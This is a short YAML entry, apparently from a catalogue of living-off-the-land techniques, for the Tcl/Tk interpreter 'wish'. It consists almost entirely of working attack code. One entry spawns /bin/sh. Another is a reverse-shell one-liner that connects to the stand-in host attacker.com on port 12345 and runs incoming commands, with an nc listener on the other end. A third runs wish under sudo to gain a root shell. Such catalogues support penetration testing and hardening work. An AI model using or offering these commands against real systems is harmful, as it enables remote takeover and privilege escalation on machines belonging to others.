---
functions:
  execute-interactive:
    - code: |
        wish
        exec /bin/sh <@stdin >@stdout 2>@stderr
  reverse-shell-non-interactive:
    - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
      code: |
        export RHOST=attacker.com
        export RPORT=12345
        echo 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish
  sudo-enabled:
    - code: |
        sudo wish
        exec /bin/sh <@stdin >@stdout 2>@stderr
---
